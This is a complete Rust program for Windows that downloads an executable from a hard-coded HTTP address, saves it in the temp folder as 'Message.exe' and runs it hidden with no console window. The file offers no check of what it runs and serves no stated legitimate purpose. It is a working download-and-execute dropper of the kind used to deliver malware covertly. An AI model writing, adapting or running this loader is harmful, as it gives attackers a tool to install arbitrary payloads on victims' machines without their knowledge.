use futures_util::StreamExt;
use tokio::fs::File;
use tokio::io::AsyncWriteExt;
use reqwest::Client;
use winapi::um::errhandlingapi::GetLastError;
use std::path::{Path, PathBuf};
use std::ptr::null_mut; // Add this import
use winapi::um::processthreadsapi::{CreateProcessW, PROCESS_INFORMATION, STARTUPINFOW};
use winapi::um::winbase::CREATE_NO_WINDOW;
use widestring::WideCString;
use winapi::um::handleapi::CloseHandle;

#[tokio::main]
async fn main() {
    let url = "http://192.168.102.134:8080/test.exe"; // Replace with your URL
    let temp_path: PathBuf = std::env::temp_dir().join("Message.exe");

    let client = Client::new();

    match download_file(&client, url, &temp_path).await {
        Ok(_) => {
            println!("File downloaded successfully.");

            if execute_file(&temp_path).await {
                println!("Executed Successfully");
            } else {
                println!("Unable to execute the file");
            }
        }
        Err(e) => println!("Failed to download the file: {:?}", e),
    }
}

async fn download_file(client: &Client, url: &str, path: &Path) -> Result<(), Box<dyn std::error::Error>> {
    let response = client.get(url).send().await?;
    if response.status().is_success() {
        let mut file = File::create(path).await?;
        let mut stream = response.bytes_stream();

        while let Some(chunk) = stream.next().await {
            let chunk = chunk?;
            file.write_all(&chunk).await?;
        }

        Ok(())
    } else {
        Err(Box::new(std::io::Error::new(
            std::io::ErrorKind::Other,
            format!("Failed to download file: HTTP {}", response.status()),
        )))
    }
}

async fn execute_file(path: &Path) -> bool {
    let exe_path = WideCString::from_str(path.to_string_lossy()).unwrap();
    let mut si: STARTUPINFOW = unsafe { std::mem::zeroed() };
    si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;

    let mut pi = PROCESS_INFORMATION {
        hProcess: null_mut(),
        hThread: null_mut(),
        dwProcessId: 0,
        dwThreadId: 0,
    };

    let result = unsafe {
        CreateProcessW(
            null_mut(),
            exe_path.into_raw(),
            null_mut(),
            null_mut(),
            false as i32,
            CREATE_NO_WINDOW,
            null_mut(),
            null_mut(),
            &mut si,
            &mut pi,
        )
    };

    if result != 0 {
        unsafe {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
        true
    } else {
        let error_code = unsafe { GetLastError() };
        println!("Failed to execute file in the background. Error code: {}", error_code);
        false
    }
}
